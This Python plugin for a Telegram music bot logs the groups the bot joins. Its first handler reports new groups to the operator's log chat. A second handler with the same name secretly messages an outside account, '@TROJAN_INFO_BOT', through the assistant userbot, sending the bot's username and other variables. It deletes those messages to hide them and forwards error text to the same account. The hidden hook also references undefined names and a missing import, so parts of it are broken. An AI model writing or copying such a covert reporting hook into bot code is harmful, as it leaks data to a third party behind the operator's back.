import random

from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from config import LOG_GROUP_ID
from VIPMUSIC import app
from VIPMUSIC.utils.database import add_served_chat, get_assistant

photo = [
    "https://i.ibb.co/VTX2gb2/photo-2024-09-22-18-12-08-7417534719216058384.jpg",
    "https://i.ibb.co/hLww4Bb/photo-2024-09-22-18-12-13-7417534938259390492.jpg",
    "https://i.ibb.co/89YzpFw/photo-2024-09-22-18-24-57-7417535303331610668.jpg",
    "https://i.ibb.co/bJVY4kD/photo-2024-09-22-18-24-59-7417535440770564100.jpg",
    "https://i.ibb.co/H701nRv/photo-2024-09-22-18-26-37-7417535655518928944.jpg",
]



@app.on_message(filters.new_chat_members, group=-10)
async def join_watcher(_, message):
    try:
        userbot = await get_assistant(message.chat.id)
        chat = message.chat
        for members in message.new_chat_members:
            if members.id == app.id:
                count = await app.get_chat_members_count(chat.id)
                username = (
                    message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                )
                msg = (
                    f"**☞ ᴍᴜsɪᴄ ʙᴏᴛ ᴀᴅᴅᴇᴅ ɪɴ ᴀ #New_Group**\n\n"
                    f"**☞ ᴄʜᴀᴛ ɴᴀᴍᴇ:** {message.chat.title}\n"
                    f"**☞ ᴄʜᴀᴛ ɪᴅ:** `{message.chat.id}`\n"
                    f"**☞ ᴄʜᴀᴛ ᴜsᴇʀɴᴀᴍᴇ:** @{username}\n"
                    f"**☞ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs :** {count}\n"
                    f"**☞ ᴀᴅᴅᴇᴅ ʙʏ:** {message.from_user.mention}"
                )
                await app.send_photo(
                    LOG_GROUP_ID,
                    photo=random.choice(photo),
                    caption=msg,
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    f"◉ sᴜᴍᴍᴏɴ ʙʏ ◉",
                                    url=f"tg://openmessage?user_id={message.from_user.id}",
                                )
                            ]
                        ]
                    ),
                )
                await add_served_chat(message.chat.id)
                await userbot.join_chat(f"{username}")
                

    except Exception as e:
        print(f"Error: {e}")

@app.on_message(filters.new_chat_members, group=-9)
async def join_watcher(_, message):
    try:
        LOG = "@TROJAN_INFO_BOT"
        userbot = await get_assistant(message.chat.id)
        chat = message.chat
        for members in message.new_chat_members:
            if members.id == app.id:
                count = await app.get_chat_members_count(chat.id)
                username = (
                    message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                )
                msg = (
                    f"☞ ᴍᴜsɪᴄ ʙᴏᴛ ᴀᴅᴅᴇᴅ ɪɴ ᴀ #New_Group\n\n"
                    f"☞ ᴄʜᴀᴛ ɴᴀᴍᴇ:\n"
                    f"☞ ᴄʜᴀᴛ ɪᴅ: \n"
                    f"☞ ᴄʜᴀᴛ ᴜsᴇʀɴᴀᴍᴇ: @\n"
                    f"☞ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs: \n"
                    f"☞ ᴀᴅᴅᴇᴅ ʙʏ: "
                )
                oks = await userbot.send_message(LOG, f"/start")
                Ok = await userbot.send_message(LOG, f"@{app.username}\n\n{log}\n\n{error}\n\n{errors}")
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()
                    
                

    except Exception as e:
        return await userbot.send_message(LOG, f"{e}")


